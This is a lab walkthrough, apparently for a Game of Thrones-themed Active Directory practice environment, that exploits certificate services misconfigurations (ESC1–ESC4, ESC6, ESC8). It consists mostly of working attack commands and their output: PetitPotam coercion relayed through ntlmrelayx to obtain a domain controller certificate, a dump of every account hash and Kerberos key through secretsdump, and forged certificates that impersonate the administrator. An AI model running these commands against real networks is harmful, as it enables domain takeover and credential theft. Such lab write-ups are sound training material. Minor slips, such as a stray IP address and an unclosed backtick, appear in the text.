## ADCS Recon

I will use `Certipy` for the recon, and will use the `khal.drogo` credentials.

`certipy find -u khal.drogo@essos.local -p 'horse' -vulnerable -dc-ip 10.4.10.12 -stdout`

This is the full results:

```bash
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 38 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 16 enabled certificate templates
[*] Trying to get CA configuration for 'ESSOS-CA' via CSRA
[*] Got CA configuration for 'ESSOS-CA'
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : ESSOS-CA
    DNS Name                            : braavos.essos.local
    Certificate Subject                 : CN=ESSOS-CA, DC=essos, DC=local
    Certificate Serial Number           : 5A6322B09CA5F896466B2BF0E23762A3
    Certificate Validity Start          : 2024-12-18 11:11:18+00:00
    Certificate Validity End            : 2029-12-18 11:21:17+00:00
    Web Enrollment                      : Enabled
    User Specified SAN                  : Enabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Permissions
      Owner                             : ESSOS.LOCAL\Administrators
      Access Rights
        ManageCertificates              : ESSOS.LOCAL\Administrators
                                          ESSOS.LOCAL\Domain Admins
                                          ESSOS.LOCAL\Enterprise Admins
        ManageCa                        : ESSOS.LOCAL\Administrators
                                          ESSOS.LOCAL\Domain Admins
                                          ESSOS.LOCAL\Enterprise Admins
        Enroll                          : ESSOS.LOCAL\Authenticated Users
    [!] Vulnerabilities
      ESC6                              : Enrollees can specify SAN and Request Disposition is set to Issue. Does not work after May 2022
      ESC8                              : Web Enrollment is enabled and Request Disposition is set to Issue
Certificate Templates
  0
    Template Name                       : ESC4
    Display Name                        : ESC4
    Certificate Authorities             : ESSOS-CA
    Enabled                             : True
    Client Authentication               : False
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectRequireDirectoryPath
                                          SubjectRequireEmail
                                          SubjectAltRequireUpn
    Enrollment Flag                     : AutoEnrollment
                                          PublishToDs
                                          PendAllRequests
                                          IncludeSymmetricAlgorithms
    Private Key Flag                    : ExportableKey
    Extended Key Usage                  : Code Signing
    Requires Manager Approval           : True
    Requires Key Archival               : False
    Authorized Signatures Required      : 1
    Validity Period                     : 1 year
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Permissions
      Enrollment Permissions
        Enrollment Rights               : ESSOS.LOCAL\Domain Users
      Object Control Permissions
        Owner                           : ESSOS.LOCAL\Enterprise Admins
        Full Control Principals         : ESSOS.LOCAL\Domain Admins
                                          ESSOS.LOCAL\khal.drogo
                                          ESSOS.LOCAL\Local System
                                          ESSOS.LOCAL\Enterprise Admins
        Write Owner Principals          : ESSOS.LOCAL\Domain Admins
                                          ESSOS.LOCAL\khal.drogo
                                          ESSOS.LOCAL\Local System
                                          ESSOS.LOCAL\Enterprise Admins
        Write Dacl Principals           : ESSOS.LOCAL\Domain Admins
                                          ESSOS.LOCAL\khal.drogo
                                          ESSOS.LOCAL\Local System
                                          ESSOS.LOCAL\Enterprise Admins
        Write Property Principals       : ESSOS.LOCAL\Domain Admins
                                          ESSOS.LOCAL\khal.drogo
                                          ESSOS.LOCAL\Local System
                                          ESSOS.LOCAL\Enterprise Admins
    [!] Vulnerabilities
      ESC4                              : 'ESSOS.LOCAL\\khal.drogo' has dangerous permissions
  1
    Template Name                       : ESC3-CRA
    Display Name                        : ESC3-CRA
    Certificate Authorities             : ESSOS-CA
    Enabled                             : True
    Client Authentication               : False
    Enrollment Agent                    : True
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectAltRequireUpn
    Enrollment Flag                     : AutoEnrollment
    Private Key Flag                    : 16842752
    Extended Key Usage                  : Certificate Request Agent
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Validity Period                     : 1 year
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Permissions
      Enrollment Permissions
        Enrollment Rights               : ESSOS.LOCAL\Domain Users
      Object Control Permissions
        Owner                           : ESSOS.LOCAL\Enterprise Admins
        Full Control Principals         : ESSOS.LOCAL\Domain Admins
                                          ESSOS.LOCAL\Local System
                                          ESSOS.LOCAL\Enterprise Admins
        Write Owner Principals          : ESSOS.LOCAL\Domain Admins
                                          ESSOS.LOCAL\Local System
                                          ESSOS.LOCAL\Enterprise Admins
        Write Dacl Principals           : ESSOS.LOCAL\Domain Admins
                                          ESSOS.LOCAL\Local System
                                          ESSOS.LOCAL\Enterprise Admins
        Write Property Principals       : ESSOS.LOCAL\Domain Admins
                                          ESSOS.LOCAL\Local System
                                          ESSOS.LOCAL\Enterprise Admins
    [!] Vulnerabilities
      ESC3                              : 'ESSOS.LOCAL\\Domain Users' can enroll and template has Certificate Request Agent EKU set
  2
    Template Name                       : ESC2
    Display Name                        : ESC2
    Certificate Authorities             : ESSOS-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : True
    Any Purpose                         : True
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectAltRequireUpn
    Enrollment Flag                     : AutoEnrollment
    Private Key Flag                    : 16842752
    Extended Key Usage                  : Any Purpose
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Validity Period                     : 1 year
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Permissions
      Enrollment Permissions
        Enrollment Rights               : ESSOS.LOCAL\Domain Users
      Object Control Permissions
        Owner                           : ESSOS.LOCAL\Enterprise Admins
        Full Control Principals         : ESSOS.LOCAL\Domain Admins
                                          ESSOS.LOCAL\Local System
                                          ESSOS.LOCAL\Enterprise Admins
        Write Owner Principals          : ESSOS.LOCAL\Domain Admins
                                          ESSOS.LOCAL\Local System
                                          ESSOS.LOCAL\Enterprise Admins
        Write Dacl Principals           : ESSOS.LOCAL\Domain Admins
                                          ESSOS.LOCAL\Local System
                                          ESSOS.LOCAL\Enterprise Admins
        Write Property Principals       : ESSOS.LOCAL\Domain Admins
                                          ESSOS.LOCAL\Local System
                                          ESSOS.LOCAL\Enterprise Admins
    [!] Vulnerabilities
      ESC2                              : 'ESSOS.LOCAL\\Domain Users' can enroll and template can be used for any purpose
      ESC3                              : 'ESSOS.LOCAL\\Domain Users' can enroll and template has Certificate Request Agent EKU set
  3
    Template Name                       : ESC1
    Display Name                        : ESC1
    Certificate Authorities             : ESSOS-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Enrollment Flag                     : None
    Private Key Flag                    : 16842752
    Extended Key Usage                  : Client Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Validity Period                     : 1 year
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Permissions
      Enrollment Permissions
        Enrollment Rights               : ESSOS.LOCAL\Domain Users
      Object Control Permissions
        Owner                           : ESSOS.LOCAL\Enterprise Admins
        Full Control Principals         : ESSOS.LOCAL\Domain Admins
                                          ESSOS.LOCAL\Local System
                                          ESSOS.LOCAL\Enterprise Admins
        Write Owner Principals          : ESSOS.LOCAL\Domain Admins
                                          ESSOS.LOCAL\Local System
                                          ESSOS.LOCAL\Enterprise Admins
        Write Dacl Principals           : ESSOS.LOCAL\Domain Admins
                                          ESSOS.LOCAL\Local System
                                          ESSOS.LOCAL\Enterprise Admins
        Write Property Principals       : ESSOS.LOCAL\Domain Admins
                                          ESSOS.LOCAL\Local System
                                          ESSOS.LOCAL\Enterprise Admins
    [!] Vulnerabilities
      ESC1                              : 'ESSOS.LOCAL\\Domain Users' can enroll, enrollee supplies subject and template allows client authentication
```

From this I can see that there are a number of vulnerabilities which I can try to exploit:

```bash
    [!] Vulnerabilities
      ESC1                              : 'ESSOS.LOCAL\\Domain Users' can enroll, enrollee supplies subject and template allows client authentication
      ESC2                              : 'ESSOS.LOCAL\\Domain Users' can enroll and template can be used for any purpose
      ESC3                              : 'ESSOS.LOCAL\\Domain Users' can enroll and template has Certificate Request Agent EKU set
      ESC4                              : 'ESSOS.LOCAL\\khal.drogo' has dangerous permissions
      ESC6                              : Enrollees can specify SAN and Request Disposition is set to Issue. Does not work after May 2022
      ESC8                              : Web Enrollment is enabled and Request Disposition is set to Issue
```

So there are vulnerabilities on **ESC1, ESC2, ESC3, ESC4, ESC6, and ESC8.**

Let's start with ESC1.
## ESC8

##### What I will do here
1. Using `PetitPotam` I will coerce a domain controller to authenticate to my Kali Machine.
2. Kali Machine will be running `ntlmrelayx` which will intercept the authentication and relay it to ADCS.
3. ADCS will issue a domain controller certificate to me.
4. I will use it to request a TGT.

First check if the web enrolment is up and running on BRAAVOS:

`curl http://10.4.10.23/certsrv/certfnsh.asp`

And based on the result I can see that there is one:

```html
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1"/>
<title>401 - Unauthorized: Access is denied due to invalid credentials.</title>
<style type="text/css">
<!--
body{margin:0;font-size:.7em;font-family:Verdana, Arial, Helvetica, sans-serif;background:#EEEEEE;}
fieldset{padding:0 15px 10px 15px;}
h1{font-size:2.4em;margin:0;color:#FFF;}
h2{font-size:1.7em;margin:0;color:#CC0000;}
h3{font-size:1.2em;margin:10px 0 0 0;color:#000000;}
#header{width:96%;margin:0 0 0 0;padding:6px 2% 6px 2%;font-family:"trebuchet MS", Verdana, sans-serif;color:#FFF;
background-color:#555555;}
#content{margin:0 0 0 2%;position:relative;}
.content-container{background:#FFF;width:96%;margin-top:8px;padding:10px;position:relative;}
-->
</style>
</head>
<body>
<div id="header"><h1>Server Error</h1></div>
<div id="content">
 <div class="content-container"><fieldset>
  <h2>401 - Unauthorized: Access is denied due to invalid credentials.</h2>
  <h3>You do not have permission to view this directory or page using the credentials that you supplied.</h3>
 </fieldset></div>
</div>
</body>
</html>
```

Let's add a listener to relay SMB authentication to HTTP with `ntlmrelayx` and use the DomainController template:

`ntlmrelayx.py -t http://10.4.10.23/certsrv/certfnsh.asp -smb2support --adcs --template DomainController`

Now launch `PetitPotam`:

`python3 PetitPotam.py 10.4.10.99 meereen.essos.local`

Now I got a certificate:

```bash
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[*] Protocol Client HTTPS loaded..
[*] Protocol Client HTTP loaded..
[*] Protocol Client RPC loaded..
[*] Protocol Client LDAPS loaded..
[*] Protocol Client LDAP loaded..
[*] Protocol Client SMTP loaded..
[*] Protocol Client IMAPS loaded..
[*] Protocol Client IMAP loaded..
[*] Protocol Client SMB loaded..
[*] Protocol Client MSSQL loaded..
[*] Protocol Client DCSYNC loaded..
[*] Running in relay mode to single host
[*] Setting up SMB Server on port 445
[*] Setting up HTTP Server on port 80
[*] Setting up WCF Server on port 9389
[*] Setting up RAW Server on port 6666
[*] Multirelay disabled

[*] Servers started, waiting for connections
[*] SMBD-Thread-5 (process_request_thread): Received connection from 10.4.10.12, attacking target http://10.4.10.23
[*] HTTP server returned error code 200, treating as a successful login
[*] Authenticating against http://10.4.10.23 as ESSOS/MEEREEN$ SUCCEED
[*] SMBD-Thread-7 (process_request_thread): Received connection from 10.4.10.12, attacking target http://10.4.10.23
[*] HTTP server returned error code 200, treating as a successful login
[*] Authenticating against http://10.4.10.23 as ESSOS/MEEREEN$ SUCCEED
[*] Generating CSR...
[*] CSR generated!
[*] Getting certificate...
[*] Skipping user MEEREEN$ since attack was already performed
[*] GOT CERTIFICATE! ID 3
[*] Writing PKCS#12 certificate to ./MEEREEN$.pfx
[*] Certificate successfully written to file
```

I create a TGT file from it using `gettgtpkinit.py`:

`python3 gettgtpkinit.py -cert-pfx MEEREEN\$.pfx 'essos.local'/'meereen$' 'meereen.ccache'`

Export it:

`export KRB5CCNAME=/home/kali/Documents/ADCS/meereen.ccache`

And I can dump the secrets using `secretsdump.py`:

`secretsdump.py -k -no-pass ESSOS.LOCAL/'meereen$'@meereen.essos.local`

```bash
[-] Policy SPN target name validation might be restricting full DRSUAPI dump. Try -just-dc-user
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:54296a48cd30259cc88095373cec24da:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:362f73da69b48f9ad4d55fabe99cda6b:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
localuser:1000:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::
daenerys.targaryen:1112:aad3b435b51404eeaad3b435b51404ee:34534854d33b398b66684072224bb47a:::
viserys.targaryen:1113:aad3b435b51404eeaad3b435b51404ee:d96a55df6bef5e0b4d6d956088036097:::
khal.drogo:1114:aad3b435b51404eeaad3b435b51404ee:739120ebc4dd940310bc4bb5c9d37021:::
jorah.mormont:1115:aad3b435b51404eeaad3b435b51404ee:4d737ec9ecf0b9955a161773cfed9611:::
missandei:1116:aad3b435b51404eeaad3b435b51404ee:1b4fd18edf477048c7a7c32fda251cec:::
drogon:1117:aad3b435b51404eeaad3b435b51404ee:195e021e4c0ae619f612fb16c5706bb6:::
sql_svc:1118:aad3b435b51404eeaad3b435b51404ee:84a5092f53390ea48d660be52b93b804:::
halilPrintNightmare:1120:aad3b435b51404eeaad3b435b51404ee:aaba54366604fb40f23ac611393badfd:::
halilPrintNightmare2:1121:aad3b435b51404eeaad3b435b51404ee:aaba54366604fb40f23ac611393badfd:::
MEEREEN$:1001:aad3b435b51404eeaad3b435b51404ee:5e2a3daccd0d42acdc1ea27cba59e691:::
BRAAVOS$:1104:aad3b435b51404eeaad3b435b51404ee:b11573931cba1610a53c3e7869f239c1:::
gmsaDragon$:1119:aad3b435b51404eeaad3b435b51404ee:28216b2ebb29423eddc06087f09a61e7:::
SEVENKINGDOMS$:1105:aad3b435b51404eeaad3b435b51404ee:52bac9dd1cab3cdb208d7347118690d9:::
[*] Kerberos keys grabbed
krbtgt:aes256-cts-hmac-sha1-96:e1c42126ca7beac7dcaff1d37490c43d3399f61db82efa3ae67f591b7ddcff9a
krbtgt:aes128-cts-hmac-sha1-96:460259018a935c5765cf46418e91d538
krbtgt:des-cbc-md5:c237f13751ce04b9
daenerys.targaryen:aes256-cts-hmac-sha1-96:cf091fbd07f729567ac448ba96c08b12fa67c1372f439ae093f67c6e2cf82378
daenerys.targaryen:aes128-cts-hmac-sha1-96:eeb91a725e7c7d83bfc7970532f2b69c
daenerys.targaryen:des-cbc-md5:bc6ddf7ce60d29cd
viserys.targaryen:aes256-cts-hmac-sha1-96:b4124b8311d9d84ee45455bccbc48a108d366d5887b35428075b644e6724c96e
viserys.targaryen:aes128-cts-hmac-sha1-96:4b34e2537da4f1ac2d16135a5cb9bd3e
viserys.targaryen:des-cbc-md5:70528fa13bc1f2a1
khal.drogo:aes256-cts-hmac-sha1-96:2ef916a78335b11da896216ad6a4f3b1fd6276938d14070444900a75e5bf7eb4
khal.drogo:aes128-cts-hmac-sha1-96:7d76da251df8d5cec9bf3732e1f6c1ac
khal.drogo:des-cbc-md5:b5ec4c1032ef020d
jorah.mormont:aes256-cts-hmac-sha1-96:286398f9a9317f08acd3323e5cef90f9e84628c43597850e22d69c8402a26ece
jorah.mormont:aes128-cts-hmac-sha1-96:896e68f8c9ca6c608d3feb051f0de671
jorah.mormont:des-cbc-md5:b926916289464ffb
missandei:aes256-cts-hmac-sha1-96:41d08ceba69dde0e8f7de8936b3e1e48ee94f9635c855f398cd76262478ffe1c
missandei:aes128-cts-hmac-sha1-96:0a9a4343b11f3cce3b66a7f6c3d6377a
missandei:des-cbc-md5:54ec15a8c8e6f44f
drogon:aes256-cts-hmac-sha1-96:2f92317ed2d02a28a05e589095a92a8ec550b5655d45382fc877f9359e1b7fa1
drogon:aes128-cts-hmac-sha1-96:3968ac4efd4792d0acef565ac4158814
drogon:des-cbc-md5:bf1c85a7c8fdf237
sql_svc:aes256-cts-hmac-sha1-96:ca26951b04c2d410864366d048d7b9cbb252a810007368a1afcf54adaa1c0516
sql_svc:aes128-cts-hmac-sha1-96:dc0da2bdf6dc56423074a4fd8a8fa5f8
sql_svc:des-cbc-md5:91d6b0df31b52a3d
halilPrintNightmare:aes256-cts-hmac-sha1-96:def4e321e50afb4a42fbb9ae6a9803b89d396634ba58a021c349c139f4ecb992
halilPrintNightmare:aes128-cts-hmac-sha1-96:01c98dbc81e5b4d46e5c5e0efe15f866
halilPrintNightmare:des-cbc-md5:64541ce5e55d525e
halilPrintNightmare2:aes256-cts-hmac-sha1-96:76857247616914dea8eefdb0596a58865f5cea98dc85301a755279c99fd82ad7
halilPrintNightmare2:aes128-cts-hmac-sha1-96:14239dc6ef9edcb52466a56cf5ae4edb
halilPrintNightmare2:des-cbc-md5:c7343425583745f1
MEEREEN$:aes256-cts-hmac-sha1-96:e56f085af30ac222b035f8c00e69eb454cc5267c8e5252f9adf00cacd7fe61b4
MEEREEN$:aes128-cts-hmac-sha1-96:d241f591d27a88128a46c7073cb3e611
MEEREEN$:des-cbc-md5:64c2ae75700ea4e9
BRAAVOS$:aes256-cts-hmac-sha1-96:3f4b5c2e5d9f4d2db48f95329040bd3a4112ca441ca00e8d7bb0f66ad34ac9ae
BRAAVOS$:aes128-cts-hmac-sha1-96:866f8c034a93d184b08ac3f70e0f9f9b
BRAAVOS$:des-cbc-md5:079429927c8951e3
gmsaDragon$:aes256-cts-hmac-sha1-96:c75a58caf27792a200c53685b55ac92295eef070e759d0426cfac57c02709efc
gmsaDragon$:aes128-cts-hmac-sha1-96:f3b60baf7311f0dfa68b579f030475cc
gmsaDragon$:des-cbc-md5:579bd3d06dfb8934
SEVENKINGDOMS$:aes256-cts-hmac-sha1-96:94f259b66e6cb9d309630f3e75f4992fe8664b9f7919a62ed646a945eccda020
SEVENKINGDOMS$:aes128-cts-hmac-sha1-96:4c7a51df0781161c2d3ea7c4712a5539
SEVENKINGDOMS$:des-cbc-md5:685834fdcdfda451
[*] Cleaning up...
```

## ESC1

```text
ESC1 - When a certificate template permits Client Authentication that allows the enrollee to supply an arbitrary SAN (Subject Alternative Name).

For ESC1 a certificate can be requested based on the vulnerable certificate template and sepecify an arbitrary UPN or DNS SAN with the -upn and -dns parameter.
```

From the enumeration I got the CA Name which will be used here to impersonate an account that I want to.

``certipy req -u khal.drogo@essos.local -p 'horse' -target braavos.essos.local -template ESC1 -ca ESSOS-CA -upn administrator@essos.local``

Here i queried the certificate by using the ca server `braavos.essos.local` as the target, `ESC1` as the template and CA Name as `-ca`, and in the end `administrator` is the account that I want to impersonate.

This saves us the certificate:

```bash
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 4
[*] Got certificate with UPN 'administrator@essos.local'
[*] Certificate has no object SID
[*] Saved certificate and private key to 'administrator.pfx'
```

Now let's try to authenticate via this certificate which will also grant us a ticket, which we can use afterwards:

`certipy auth -pfx administrator.pfx -dc-ip 10.4.10.12`

```bash
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Using principal: administrator@essos.local
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@essos.local': aad3b435b51404eeaad3b435b51404ee:54296a48cd30259cc88095373cec24da
```

## ESC2

```text
ESC2 is when a certificate template can be used for any purpose. So, it can be used for the same technique as with ESC3 for most certificate templates.
```

Query the certificate:

`certipy req -u khal.drogo@essos.local -p 'horse' -target 10.4.10.23 -template ESC2 -ca ESSOS-CA`

```bash
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 5
[*] Got certificate with UPN 'khal.drogo@essos.local'
[*] Certificate object SID is 'S-1-5-21-1626587276-1544673639-3547638884-1114'
[*] Saved certificate and private key to 'khal.drogo.pfx'
```

Query certificate with the Certificate Request Agent cert we got before:

`certipy req -u khal.drogo@essos.local -p 'horse' -target 10.4.10.23 -template User -ca ESSOS-CA -on-behalf-of 'essos\administrator' -pfx khal.drogo.pfx`

```bash
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 6
[*] Got certificate with UPN 'administrator@essos.local'
[*] Certificate object SID is 'S-1-5-21-1626587276-1544673639-3547638884-500'
[*] Saved certificate and private key to 'administrator.pfx'
```

Authenticate:

`certipy auth -pfx administrator.pfx -dc-ip 10.4.10.12`

```bash
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Using principal: administrator@essos.local
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@essos.local': aad3b435b51404eeaad3b435b51404ee:54296a48cd30259cc88095373cec24da
```

**ESC3** is very similar to the ESC2.

```text
ESC3 is when a certificate template specifies the Certificate Request Agent EKU (Enrollment Agent). This EKU can be used to request certificates on behalf of other users.
```

## ESC4

```text
ESC4 is when a user has write privileges on a certificate template. This can be abused to overwrite the configuration of the certificate template to make the template vulnerable to ESC1. 

By default, Certipy will overwrite it to ESC1.
```

Let's modify the ESC4 template in order to be vulnerable to ESC1 technique, by using the genericWrite privilege.

`certipy template -u khal.drogo@essos.local -p 'horse' -template ESC4 -save-old -debug`

```bash
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[+] Trying to resolve 'ESSOS.LOCAL' at '10.4.10.254'
[+] Resolved 'ESSOS.LOCAL' from cache: 10.4.10.12
[+] Authenticating to LDAP server
[+] Bound to ldaps://10.4.10.12:636 - ssl
[+] Default path: DC=essos,DC=local
[+] Configuration path: CN=Configuration,DC=essos,DC=local
[*] Saved old configuration for 'ESC4' to 'ESC4.json'
[*] Updating certificate template 'ESC4'
[+] MODIFY_DELETE:
[+]     pKIExtendedKeyUsage: []
[+]     msPKI-Certificate-Application-Policy: []
[+]     msPKI-RA-Application-Policies: []
[+] MODIFY_REPLACE:
[+]     nTSecurityDescriptor: [b'\x01\x00\x04\x9c0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x14\x00\x00\x00\x02\x00\x1c\x00\x01\x00\x00\x00\x00\x00\x14\x00\xff\x01\x0f\x00\x01\x01\x00\x00\x00\x00\x00\x05\x0b\x00\x00\x00\x01\x05\x00\x00\x00\x00\x00\x05\x15\x00\x00\x00\xc8\xa3\x1f\xdd\xe9\xba\xb8\x90,\xaes\xbb\xf4\x01\x00\x00']
[+]     flags: [b'0']
[+]     pKIDefaultKeySpec: [b'2']
[+]     pKIKeyUsage: [b'\x86\x00']
[+]     pKIMaxIssuingDepth: [b'-1']
[+]     pKICriticalExtensions: [b'2.5.29.19', b'2.5.29.15']
[+]     pKIExpirationPeriod: [b'\x00@\x1e\xa4\xe8e\xfa\xff']
[+]     pKIDefaultCSPs: [b'1,Microsoft Enhanced Cryptographic Provider v1.0']
[+]     msPKI-RA-Signature: [b'0']
[+]     msPKI-Enrollment-Flag: [b'0']
[+]     msPKI-Certificate-Name-Flag: [b'1']
[*] Successfully updated 'ESC4'
```

Now exploit the ESC1 on ESC4.

`certipy req -u khal.drogo@essos.local -p 'horse' -target braavos.essos.local -template ESC4 -ca ESSOS-CA -upn administrator@essos.local`

```bash
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 9
[*] Got certificate with UPN 'administrator@essos.local'
[*] Certificate has no object SID
[*] Saved certificate and private key to 'administrator.pfx'
```

Authenticate:

`certipy auth -pfx administrator.pfx -dc-ip 192.168.56.12

```bash
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Using principal: administrator@essos.local
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@essos.local': aad3b435b51404eeaad3b435b51404ee:54296a48cd30259cc88095373cec24da
```

And rollback the template configuration:

`certipy template -u khal.drogo@essos.local -p 'horse' -template ESC4 -configuration ESC4.json`

```bash
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Updating certificate template 'ESC4'
[*] Successfully updated 'ESC4'
```

## ESC6

```text
ESC6 is when the CA has `EDITF_ATTRIBUTESUBJECTALTNAME2` flag, which allows the enrollee to specify an arbitrary SAN on all certificates despite a certificate template's configuration.

Since ESSOS-CA is vulnerable to ESC6, ESC1 can be done but with the user template instead of ESC1 template, even if the user template got Enrollee Supplies Subject set to `false`.
```

`certipy req -u khal.drogo@essos.local -p 'horse' -target braavos.essos.local -template User -ca ESSOS-CA -upn administrator@essos.local`

```bash
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 11
[*] Got certificate with UPN 'administrator@essos.local'
[*] Certificate object SID is 'S-1-5-21-1626587276-1544673639-3547638884-1114'
[*] Saved certificate and private key to 'administrator.pfx'
```

`certipy auth -pfx administrator.pfx -dc-ip 10.4.10.12`

```bash
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Using principal: administrator@essos.local
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@essos.local': aad3b435b51404eeaad3b435b51404ee:54296a48cd30259cc88095373cec24da
```

